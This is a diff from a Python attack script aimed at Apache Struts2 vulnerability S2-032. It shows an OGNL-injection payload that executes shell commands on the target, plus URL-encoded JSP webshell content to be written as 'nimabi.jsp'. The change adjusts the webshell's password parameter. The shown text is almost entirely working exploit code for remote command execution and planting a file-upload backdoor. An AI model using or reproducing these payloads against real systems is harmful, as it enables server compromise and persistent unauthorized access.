@@ -761,9 +761,9 @@ def checkS2032(url):
     poc_whoami = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=A&ppp=%20&encoding=UTF-8"
 		
     shellname="nimabi.jsp"
-    shellpwd="f"
-    shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
-    shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    shellpwd="n"
+    shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
+    shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
 
     try:
         result = exploitS2032(poc)
